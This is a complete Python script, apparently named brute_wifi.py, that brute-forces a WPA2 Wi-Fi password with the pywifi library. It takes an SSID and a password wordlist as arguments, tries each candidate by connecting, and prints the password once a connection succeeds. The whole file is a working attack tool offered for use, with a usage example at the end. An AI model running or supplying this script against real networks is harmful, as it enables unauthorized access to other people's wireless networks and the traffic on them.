# pip install pywifi
# pip install comtypes

import argparse
import os
import os.path
import platform
import time

import pywifi
from pywifi import PyWiFi, Profile
from pywifi import const as cnst

client_ssid = None
path_to_file = None

RED = "\033[1;31m"
BLUE = "\033[1;34m"
CYAN = "\033[1;36m"
GREEN = "\033[0;32m"
RESET = "\033[0;0m"
BOLD = "\033[;1m"
REVERSE = "\033[;7m"
YELLOW = "\033[33m"


try:
    wifi = PyWiFi()
    ifaces = wifi.interfaces()[0]

    ifaces.scan()
    results = ifaces.scan_results()

    wifi = pywifi.PyWiFi()
    iface = wifi.interfaces()[0]

except:
    print("[-] Error system")

type = False


def main(ssid, password, number):
    profile = Profile()
    profile.ssid = ssid
    profile.auth = cnst.AUTH_ALG_OPEN
    profile.akm.append(cnst.AKM_TYPE_WPA2PSK)
    profile.cipher = cnst.CIPHER_TYPE_CCMP

    profile.key = password
    iface.remove_all_network_profiles()
    tmp_profile = iface.add_network_profile(profile)
    time.sleep(0.1)
    iface.connect(tmp_profile)
    time.sleep(0.35)
    if ifaces.status() == cnst.IFACE_CONNECTED:
        time.sleep(1)
        print(BOLD, f'{GREEN}[*] Crack success!{RESET}')
        print(BOLD, f'{GREEN}[*] password is: {password}{RESET}')
        time.sleep(1)
        exit()
    else:
        print(RED, f'[{number}] Crack Failed using: {YELLOW}{password}{RESET}')


def pwd(ssid, file):
    number = 0
    with open(file, 'r', encoding='utf-8') as words:
        for line in words:
            number += 1
            line = line.split("\n")
            pwd = line[0]
            main(ssid, pwd, number)


def menu(client_ssid, path_to_file):
    parser = argparse.ArgumentParser(description='argparse Example')

    parser.add_argument('-s', '--ssid', metavar='', type=str, help='SSID = WIFI Name..')
    parser.add_argument('-w', '--wordlist', metavar='', type=str, help='keywords list ...')

    print()
    args = parser.parse_args()

    print(CYAN, "[+] You are using ", BOLD, platform.system(), platform.machine(), "...")
    time.sleep(1.5)

    if args.wordlist and args.ssid:
        ssid = args.ssid
        filee = args.wordlist
    else:
        print(BLUE)
        ssid = client_ssid
        filee = path_to_file

        # breaking
    if os.path.exists(filee):
        if platform.system().startswith("Win" or "win"):
            os.system("cls")
        else:
            os.system("clear")

        print(BLUE, "[~] Cracking...")
        pwd(ssid, filee)

    else:
        print(RED, "[-] No Such File.", BLUE)
    return args


try:
    menu(client_ssid, path_to_file)
except TypeError:
    print(RED, "write args\n example: python brute_wifi.py -s ExampleWiFiName -w ExamplePasswordList.txt", RESET)
